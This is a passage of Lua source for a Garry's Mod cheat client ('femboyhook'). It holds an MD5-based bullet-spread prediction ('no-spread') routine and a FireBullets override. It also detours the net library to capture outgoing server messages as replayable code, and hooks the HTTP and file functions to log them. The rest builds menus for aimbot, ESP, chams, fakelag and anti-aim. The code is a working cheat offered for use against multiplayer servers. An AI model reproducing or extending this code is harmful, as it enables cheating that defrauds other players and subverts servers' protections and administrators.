        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_h, c, d, a, b, X[3], 16, SPR.Const[43])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_h, b, c, d, a, X[6], 23, SPR.Const[44])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_h, a, b, c, d, X[9], 4, SPR.Const[45])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_h, d, a, b, c, X[12], 11, SPR.Const[46])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_h, c, d, a, b, X[15], 16, SPR.Const[47])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_h, b, c, d, a, X[2], 23, SPR.Const[48])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_i, a, b, c, d, X[0], 6, SPR.Const[49])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_i, d, a, b, c, X[7], 10, SPR.Const[50])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_i ,c, d, a, b, X[14], 15, SPR.Const[51])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_i, b, c, d, a, X[5], 21, SPR.Const[52])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_i, a, b, c, d, X[12], 6, SPR.Const[53])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_i, d, a, b, c, X[3], 10, SPR.Const[54])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_i, c, d, a, b, X[10], 15, SPR.Const[55])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_i, b, c, d, a, X[1], 21, SPR.Const[56])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_i, a, b, c, d, X[8], 6, SPR.Const[57])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_i, d, a, b, c, X[15], 10, SPR.Const[58])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_i, c, d, a, b, X[6], 15, SPR.Const[59])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_i, b, c, d, a, X[13], 21, SPR.Const[60])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        a = SPR.MD5.z(md5_i, a, b, c, d, X[4], 6, SPR.Const[61])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        d = SPR.MD5.z(md5_i, d, a, b, c, X[11], 10, SPR.Const[62])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        c = SPR.MD5.z(md5_i, c, d, a, b, X[2], 15, SPR.Const[63])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
        b = SPR.MD5.z(md5_i, b, c, d, a, X[9], 21, SPR.Const[64])
        a = SPR.MD5.Fix(a) b = SPR.MD5.Fix(b) c = SPR.MD5.Fix(c) d = SPR.MD5.Fix(d)
    return A + a, B + b, C + c, D + d
end
 
SPR.Spread = {
    weapon_smg1 = {0.04362, 0.04362},
    weapon_ar2 = {0.02618, 0.02618},
    weapon_shotgun = {0.08716, 0.08716},
    weapon_pistol = {0.00873, 0.00873},
}

function M9KGETSPREADVALUEBRO()
    for _, weapon in pairs(weapons.GetList()) do
        local className = weapon.ClassName
        if string.find(className, "m9k_") then
            local spreadValue = weapon.Primary and weapon.Primary.Spread or nil
            if spreadValue then
                SPR.Spread[className] = {spreadValue, spreadValue}
                print("Weapon:",className,"|Spread:",spreadValue)
            else
                print("Weapon:",className,"|No Spread")
            end
        end
    end
end
M9KGETSPREADVALUEBRO()

function SPR.MD5.PseudoRandom(number)
    local a, b, c, d = SPR.MD5.Fix(SPR.Const[65]), SPR.MD5.Fix(SPR.Const[66]), SPR.MD5.Fix(SPR.Const[67]), SPR.MD5.Fix(SPR.Const[68])
    local m = {}
    for iter = 0, 15 do
        m[iter] = 0
    end
    m[0] = number
    m[1] = 128
    m[14] = 32
    a, b, c, d = SPR.MD5.Transform(a, b, c, d, m)
    return bit.rshift(SPR.MD5.Fix(b), 16) % 256
end

LocalPlayer().FireBullets = function(pEnt, bul)
    local wep = LocalPlayer():GetActiveWeapon()
    if not IsValid(wep) then return end
    local class = wep:GetClass()
    if not SPR.Spread[class] then
        print("No Spread For This Weapon:", class)
        return wep.FireBullets(wep, pEnt, bul)
    end
    return wep.FireBullets(wep, pEnt, bul)
end

function predictSpread(cmd, ang)
    local wep = LocalPlayer():GetActiveWeapon()
    if not IsValid(wep) then return ang end
    local class = wep:GetClass()
    local cone = SPR.Spread[class]
    if not cone then
        print("Can't NoSpread This Weapon:",class)
        return ang
    end
    local seed = SPR.MD5.PseudoRandom(cmd:CommandNumber())
    local x, y = SPR.engineSpread[seed][1], SPR.engineSpread[seed][2]
    local forward, right, up = ang:Forward(), ang:Right(), ang:Up()
    local RetVec = forward + (x * cone[1] * right * -1) + (y * cone[2] * up * -1)
    local spreadAngles = RetVec:Angle()
    spreadAngles:Normalize()
    if GetConVar("developer"):GetInt() == 1 then
        print("Weapon Seed",class,":",seed)
        print("Spread Angles:",spreadAngles)
    end
    return spreadAngles
end

function NETBLOCKCREATIONROLEPLAY(t, netName)
    local MKSTR = "net." .. netName .. "("
    for i = 1, #t do
        local IDXVAL = t[i]
        if type(IDXVAL) == "number" then
            MKSTR = MKSTR .. IDXVAL .. (i == #t and "" or ", ")
        elseif type(IDXVAL) == "boolean" then
            MKSTR = MKSTR .. tostring(IDXVAL)
        elseif type(IDXVAL) == "string" then
            MKSTR = MKSTR .. "\"" .. IDXVAL .. "\"" .. (i == #t and "" or ", ")
        elseif type(IDXVAL) == "Player" or type(IDXVAL) == "Entity" or type(IDXVAL) == "NPC" then
            MKSTR = MKSTR .. "Entity(" .. tostring(IDXVAL:EntIndex()) .. ")"
        elseif type(IDXVAL) == "Vector" then
            MKSTR = MKSTR .. "Vector(" .. string.gsub(tostring(IDXVAL), "%s+", ", ") .. ")"
        elseif type(IDXVAL) == "table" then
            print("IDXVAL IS TABLE")
            print("indevalue", table.ToString(IDXVAL))
            MKSTR = MKSTR .. table.ToString(IDXVAL)
        else
            print("[netlogthing] !!! UNHANDLED !!! " .. "type(index): " .. "[" .. type(IDXVAL) .. "]" .. " index: " .. "[" .. tostring(IDXVAL) .. "]")
        end
    end

    st.BFR = st.BFR .. MKSTR .. ")" .. "\n"
    if string.match(st.BFR, "SendToServer") then
        hook.Run("OhmyGod", st.BFR)
        st.BFR = ""
    end
end

local NetORIGIN = {} 
function DETOURSROLEPLAY()
    function HANDLESNETBLOCKCREATION(netName)
        local ORIGINNETFUNC = NetORIGIN[netName]
        return function(...)
            NETBLOCKCREATIONROLEPLAY({...}, netName)
            if ORIGINNETFUNC then
                return ORIGINNETFUNC(...)
            end
        end
    end
    for k, v in pairs(st.NTCD) do
        NetORIGIN[k] = net[k] 
        net[k] = HANDLESNETBLOCKCREATION(k)
    end
end
DETOURSROLEPLAY()
function PSonmynetger(netmsg)
    if mdrconf.vars["PS_netloger"] then
        st.prnt(netmsg)
    end
end

http.Post = (function(oldFunc)
    return function(url, params, onSuccess, onFailure)
        if mdrconf.vars["PS_httploger"] then
            st.prnt(url)
            file.Append(".femboyhook/httpPostlog.txt", url .. "\n") 
        end 
        return oldFunc(url, params, onSuccess, onFailure)
    end
end)(http.Post)
http.Fetch = (function(oldFunc)
    return function(url, onSuccess, onFailure)
        if mdrconf.vars["PS_httploger"] then
            st.prnt(url)
            file.Append(".femboyhook/httpFetchlog.txt", url .. "\n")  
        end
        return oldFunc(url, onSuccess, onFailure)
    end
end)(http.Fetch)

file.Read = (function(oldFunc)
    return function(fileName, path)
        if mdrconf.vars["PS_fileloger"] then
            st.prnt(fileName)
            file.Append(".femboyhook/Filereadlog.txt", fileName .. "\n")  
        end
        return oldFunc(fileName, path)
    end
end)(file.Read)

file.Delete = (function(oldFunc)
    return function(name,path)
        if mdrconf.vars["PS_fileloger"] then
            st.prnt(name)
            file.Append(".femboyhook/FileDeletelog.txt", name .. "\n")  
        end
        return oldFunc(name,path)
    end
end)(file.Delete)

file.Find = (function(oldFunc)
    return function(name,path,sorting)
        if mdrconf.vars["PS_fileloger"] then
            st.prnt(name)
            file.Append(".femboyhook/FileFindlog.txt", name .. "\n")  
        end
        return oldFunc(name,path,sorting)
    end
end)(file.Find)

file.Write = (function(oldFunc)
    return function(fileName,content)
        if mdrconf.vars["PS_fileloger"] then
            st.prnt(fileName)
            file.Append(".femboyhook/FileWritelog.txt", fileName .. "\n")  
        end
        return oldFunc(fileName,content)
    end
end)(file.Write)

local ult_pos = LocalPlayer():GetNetworkOrigin()

// to color
function chamscolframe()
    chmcol = st.vgui_Create("DFrame")
    chmcol:SetSize(500,250)
    chmcol:Center()
    chmcol:MakePopup()
    chmcol:SetTitle("")
    chmcol:ShowCloseButton(false)
    function chmcol:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", chmcol)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
       chmcol:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("Chams Ply Vis",10,10,"chamscolply1",chmcol)
    Createcolormixer("Chams Prop Vis",120,10,"chamscolprop1",chmcol)
    Createcolormixer("Chams Me",230,10,"selfchamscol",chmcol)
    Createcolormixer("Chams Weapon Me",340,10,"selfweaponchamscol",chmcol)
    Createcolormixer("Chams Ply Inv",10,125,"chamscolply2",chmcol)
    Createcolormixer("Chams Prop Inv",120,125,"chamscolprop2",chmcol)

    CreatecheckBox("|Weapon|",230,145,"PS_selfweaponchams",chmcol)
end

function boxcolframe()
    bocol = st.vgui_Create("DFrame")
    bocol:SetSize(500,250)
    bocol:Center()
    bocol:MakePopup()
    bocol:SetTitle("")
    bocol:ShowCloseButton(false)
    function bocol:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", bocol)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
       bocol:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("Ply",10,10,"boxplycolor1",bocol)
    Createcolormixer("Prop",120,10,"boxpropcolor1",bocol)
    Createcolormixer("Fallbox",230,10,"fallboxcolor1",bocol)
    Createcolormixer("Self Box",10,125,"selfboxplycolor1",bocol)
    Createcolormixer("Hitbox",120,125,"hitboxcolor",bocol)
    Createcolormixer("Hitbox Me",230,125,"selfhitboxcolor",bocol)
end

function othercolframe()
    othercol = st.vgui_Create("DFrame")
    othercol:SetSize(500,250)
    othercol:Center()
    othercol:MakePopup()
    othercol:SetTitle("")
    othercol:ShowCloseButton(false)
    function othercol:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", othercol)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
       othercol:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("skeleton",10,10,"skeletoncolor",othercol)
    Createcolormixer("skeleton Me",120,10,"selfskeletoncolor",othercol)
end

function espcolframe()
    espcol = st.vgui_Create("DFrame")
    espcol:SetSize(500,250)
    espcol:Center()
    espcol:MakePopup()
    espcol:SetTitle("")
    espcol:ShowCloseButton(false)
    function espcol:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", espcol)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
        espcol:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("EspName",10,10,"espname",espcol)
    Createcolormixer("Health",120,10,"esphealth",espcol)
    Createcolormixer("Armor",230,10,"esparmor",espcol)
    Createcolormixer("Usergrp",340,10,"espusergrp",espcol)
end

function aimbotframe()
    aimbo = st.vgui_Create("DFrame")
    aimbo:SetSize(500,250)
    aimbo:SetPos(5,250)
    aimbo:MakePopup()
    aimbo:SetTitle("")
    aimbo:ShowCloseButton(false)
    function aimbo:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", aimbo)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
        aimbo:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("Fov Cirlce",10,10,"fovcircle",aimbo)
    Createcolormixer("Bone Box",120,10,"bonebox",aimbo)
    Createcolormixer("Snapline",230,10,"snapline",aimbo)
    CreateDropdown("",340,25,150,50,"ValveBiped.Bip01_Head1",mdrconf.util["bone"],"PS_bone",aimbo)
    CreateSlider("Fov Circle", 220, 15, 5, 130,"PS_aimbotFOV", 1, 100,aimbo)

    CreatecheckBox("|Ignores-Steam friends|",5,150,"PS_Ignores-Steam friends",aimbo)
    CreatecheckBox("|Ignores-Admins|",5,170,"PS_Ignores-Admins",aimbo)
    CreatecheckBox("|Ignores-Frozen|",5,190,"PS_Ignores-Frozen",aimbo)
    CreatecheckBox("|Ignores-Nocliping|",5,210,"PS_Ignores-Nocliping",aimbo)
    CreatecheckBox("|Ignores-God Time|",5,230,"PS_Ignores-God-time",aimbo)
    CreatecheckBox("|Ignores-Driver|",240,150,"PS_Ignores-Driver",aimbo)
    CreatecheckBox("|Ignores-Bots|",190,170,"PS_Ignores-Bots",aimbo)
    CreatecheckBox("|Hide-Shot|",190,190,"PS_hideshot",aimbo)
end

function fakelagframe()
    fakela = st.vgui_Create("DFrame")
    fakela:SetSize(500,250)
    fakela:SetPos(5,550)
    fakela:MakePopup()
    fakela:SetTitle("")
    fakela:ShowCloseButton(false)
    function fakela:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton",fakela)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
        fakela:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    Createcolormixer("FakeLag Visualisation",10,10,"fakelagbox",fakela)
    CreatecheckBox("|Adaptive|",120,30,"PS_fakelagada",fakela)
    CreateSlider("Choke Tick", 220, 15, 5, 130,"PS_fakelagfactor", 1, 14,fakela)
end

function antiframe()
    antia = st.vgui_Create("DFrame")
    antia:SetSize(500,250)
    antia:SetPos(5,550)
    antia:MakePopup()
    antia:SetTitle("")
    antia:ShowCloseButton(false)
    function antia:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton",antia)
    Close:SetPos(455, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
        antia:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end

    CreatecheckBox("|Spin|",5,30,"PS_antiaimspin",antia)
    CreatecheckBox("|Sway|",5,60,"PS_antiaimsway",antia)
    CreatecheckBox("|Custom Yaw|",5,90,"PS_antiaimcus",antia)

    CreatecheckBox("|Pitch Up|",5,120,"PS_antiaimpu",antia)
    CreatecheckBox("|Custom Pitch|",5,150,"PS_antiaimpcus",antia)

    CreateSlider("Custom Yaw", 220, 15, 5, 180,"PS_antiaimcusy", -180, 180, antia)
    CreateSlider("Custom Pitch", 220, 15, 5, 200,"PS_antiaimcusp", -89, 89, antia)

end

function aimfakelframe()
    aimfakel = st.vgui_Create("DFrame")
    aimfakel:SetSize(300,80)
    aimfakel:Center()
    aimfakel:MakePopup()
    aimfakel:SetTitle("")
    aimfakel:ShowCloseButton(false)
    function aimfakel:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end
    local Close = st.vgui_Create("DButton", aimfakel)
    Close:SetPos(255, 5)
    Close:SetText("X")
    Close:SetSize(40,25)
    function Close:DoClick()
        aimfakel:Close()
    end
    function Close:Paint(w,h)
        local v = self:IsDown()
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
        if !v and !self:IsHovered() then return end
        if v then
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        else
            st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button2"]))
        end
        st.surface_DrawRect(5,5,w-10,h-10)
    end
    local aimbobut =  st.vgui_Create( "DImageButton", aimfakel)
    aimbobut:SetPos( 160, 15 )				
    aimbobut:SetImage( "icon16/cog.png" )
    aimbobut:SetSize( 20, 20 )
    function aimbobut:DoClick()
        aimbotframe()
    end
    local fakelabut =  st.vgui_Create( "DImageButton", aimfakel)
    fakelabut:SetPos( 160, 35 )				
    fakelabut:SetImage( "icon16/cog.png" )
    fakelabut:SetSize( 20, 20 )
    function fakelabut:DoClick()
        fakelagframe()
    end

    local antiaimbut =  st.vgui_Create( "DImageButton", aimfakel)
    antiaimbut:SetPos( 160, 55 )				
    antiaimbut:SetImage( "icon16/cog.png" )
    antiaimbut:SetSize( 20, 20 )
    function antiaimbut:DoClick()
        antiframe()
    end

    CreateLabel("Aimbot Settings",10,10,aimfakel)
    CreateLabel("Fakelag Settings" ,10,30,aimfakel)
    CreateLabel("AntiAim Settings" ,10,50,aimfakel)
end

/*
      ███╗███╗   ███╗ █████╗ ██╗███╗   ██╗     ██████╗██╗  ██╗███████╗ █████╗ ████████╗███╗      
      ██╔╝████╗ ████║██╔══██╗██║████╗  ██║    ██╔════╝██║  ██║██╔════╝██╔══██╗╚══██╔══╝╚██║      
█████╗██║ ██╔████╔██║███████║██║██╔██╗ ██║    ██║     ███████║█████╗  ███████║   ██║    ██║█████╗
╚════╝██║ ██║╚██╔╝██║██╔══██║██║██║╚██╗██║    ██║     ██╔══██║██╔══╝  ██╔══██║   ██║    ██║╚════╝
      ███╗██║ ╚═╝ ██║██║  ██║██║██║ ╚████║    ╚██████╗██║  ██║███████╗██║  ██║   ██║   ███║      
      ╚══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══╝      
*/

function createPS()
    PS = st.vgui_Create("DFrame")
    PS:SetSize(st.sw(), 125) 
    PS:SetTitle('')
    PS:ShowCloseButton(false)
    PS:SetVisible(true)
    PS:SetDraggable( false )
    PS:MakePopup()
    PS.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(0, 0, 0, w, h, st.string_ToColor(mdrconf.col["Dframe2"]) ,false,false,false,false )
    end  

    PS2 = st.vgui_Create("DFrame")
    PS2:SetSize(900, 610) 
    PS2:SetTitle('')
    PS2:ShowCloseButton(false)
    PS2:SetVisible(true)
    PS2:Center()
    PS2:SetDraggable( true )
    PS2:MakePopup()
    PS2.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(0, 0, 0, w, h, st.string_ToColor(mdrconf.col["Dframe"]) ,false,false,false,false )
    end

    local Panelsh = st.vgui_Create("DPanel", PS2)
    Panelsh:SetSize(900 ,590)
    Panelsh:SetPos(0 , 10)
    Panelsh.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(0, 0, 0, w, h, st.string_ToColor(mdrconf.col["panelbtnsh"]) ,true,true ,false ,false )
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    CreateLabel("| User : " .. st.me():Nick(), 300,10,Panelsh)


    local PSSHEET = st.vgui_Create("DPropertySheet", Panelsh)
    PSSHEET:SetSize(900,550)
    PSSHEET:SetPos(0,40)

    function PSSHEET:Paint(w, h)
        st.draw_RoundedBoxEX(15, 0, 0, w, h, st.string_ToColor(mdrconf.col["Sheet"]) ,false , false ,false,false )
        st.surface_SetMaterial(Material(mdrconf.vars["PS_bckgrd"]))
        st.surface_DrawTexturedRect(0, 0, w, h)
        st.surface_SetDrawColor(st.string_ToColor(mdrconf.col["Button1"]))
        st.surface_DrawOutlinedRect(0,0,w,h,2)
    end

    local Panel1 = st.vgui_Create("DPanel", PSSHEET)
    PSSHEET:AddSheet("", Panel1)
    Panel1:SetSize(900 , 200)
    Panel1:SetPos(10 , 10)
    Panel1.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(50, 0, 0, w, h, st.string_ToColor(mdrconf.col["Panel1c"]) ,false ,false ,false ,false )
    end

    local Panel2 = st.vgui_Create("DPanel", PSSHEET)
    PSSHEET:AddSheet("", Panel2)
    Panel2:SetSize(900 , 200)
    Panel2:SetPos(10 , 10)
    Panel2.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(50, 0, 0, w, h, st.string_ToColor(mdrconf.col["Panel2c"]) ,false ,false ,false ,false )
    end

    local Panel3 = st.vgui_Create("DPanel", PSSHEET)
    PSSHEET:AddSheet("", Panel3)
    Panel3:SetSize(900 , 200)
    Panel3:SetPos(10 , 10)
    Panel3.Paint = function(self, w, h)
       st.draw_RoundedBoxEX(50, 0, 0, w, h, st.string_ToColor(mdrconf.col["Panel3c"]) ,false ,false ,false ,false )
    end

    local Panel4 = st.vgui_Create("DPanel", PSSHEET)
    PSSHEET:AddSheet("", Panel4)
    Panel4:SetSize(900 , 200)
    Panel4:SetPos(10 , 10)
    Panel4.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(50, 0, 0, w, h, st.string_ToColor(mdrconf.col["Panel4c"]) ,false ,false ,false ,false )
    end

    local Panel5 = st.vgui_Create("DPanel", PSSHEET)
    PSSHEET:AddSheet("", Panel5)
    Panel5:SetSize(900 , 200)
    Panel5:SetPos(10 , 10)
    Panel5.Paint = function(self, w, h)
        st.draw_RoundedBoxEX(50, 0, 0, w, h, st.string_ToColor(mdrconf.col["Panel5c"]) ,false ,false ,false ,false )
    end

    --[Panel Setup]--
    PSSHEET:GetItems()[1].Tab:SetVisible(false)
    PSSHEET:GetItems()[2].Tab:SetVisible(false)
    PSSHEET:GetItems()[3].Tab:SetVisible(false)
    PSSHEET:GetItems()[4].Tab:SetVisible(false)
    PSSHEET:GetItems()[5].Tab:SetVisible(false)

    local use = st.vgui_Create( "AvatarImage", PS )
	use:SetSize( 80, 80 )
	use:SetPos( 51, 22 )
	use:SetPlayer( st.me(), 64 )

    local P1Bn = st.vgui_Create("DButton", PS)
    P1Bn:SetSize(st.sw() / 5.49,125)
    P1Bn:SetPos(182,0)
